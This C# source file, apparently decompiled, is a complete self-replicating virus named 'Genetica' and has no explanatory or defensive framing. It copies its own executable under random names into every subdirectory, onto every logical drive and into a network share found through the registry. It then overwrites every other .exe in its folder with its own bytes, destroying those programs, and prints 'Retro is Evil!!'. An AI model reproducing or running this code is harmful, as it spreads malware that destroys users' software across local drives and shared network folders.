using System;
using System.IO;
using System.Reflection;
using Microsoft.Win32;

namespace Genetica;

internal class Program
{
	private static void Main(string[] args)
	{
		string[] array = null;
		short num = 0;
		int num2 = 0;
		int num3 = 5;
		string text = null;
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("System\\CurrentControlSet\\Services\\lanmanserver\\Shares", writable: false);
		object value = registryKey.GetValue("shared");
		char[] array2 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".ToCharArray();
		string[] logicalDrives = Directory.GetLogicalDrives();
		Random random = new Random();
		string location = Assembly.GetExecutingAssembly().Location;
		string text2 = Environment.CurrentDirectory;
		if (text2.Substring(text2.Length - 1) != "\\")
		{
			text2 += "\\";
		}
		array = Directory.GetFiles(text2);
		string[] directories = Directory.GetDirectories(text2, "*");
		for (int i = 0; i < num3; i++)
		{
			int num4 = random.Next(array2.Length);
			text += array2[num4];
		}
		int j = 0;
		for (int num5 = directories.Length; j < num5; j++)
		{
			if (directories[j].Substring(directories[j].Length - 1) != "\\")
			{
				string[] array3;
				string[] array4 = (array3 = directories);
				int num6 = j;
				nint num7 = num6;
				array4[num6] = array3[num7] + "\\";
				File.Copy(location, directories[j] + text + ".exe");
			}
		}
		for (num2 = 0; num2 <= logicalDrives.GetUpperBound(0); num2++)
		{
			try
			{
				File.Copy(location, logicalDrives[num2] + text + ".exe");
			}
			catch
			{
			}
		}
		string[] array5 = value as string[];
		string text3 = array5[2];
		if (array5 != null)
		{
			try
			{
				array5.GetEnumerator();
				string text4 = text3.Substring(text3.Length - (text3.Length - 5));
				text4 += "\\";
				File.Copy(location, text4 + text + ".exe");
			}
			catch
			{
			}
		}
		for (num = 0; num < array.GetUpperBound(0); num = (short)(num + 1))
		{
			if (array[num].Substring(array[num].Length - (array[num].Length - array[num].Length + 4)) == ".exe" && "\r\n" + array[num] != location)
			{
				try
				{
					string path = location;
					string path2 = array[num];
					FileStream fileStream = new FileStream(path, FileMode.Open, FileAccess.Read);
					FileStream fileStream2 = new FileStream(path2, FileMode.Create, FileAccess.Write);
					byte[] buffer = new byte[fileStream.Length];
					fileStream.Read(buffer, 0, Convert.ToInt32(fileStream.Length));
					fileStream2.Write(buffer, 0, Convert.ToInt32(fileStream.Length));
					fileStream.Close();
					fileStream2.Close();
					fileStream.Dispose();
					fileStream2.Dispose();
				}
				catch
				{
				}
			}
		}
		Console.Write("Retro is Evil!!");
		Console.Read();
	}
}
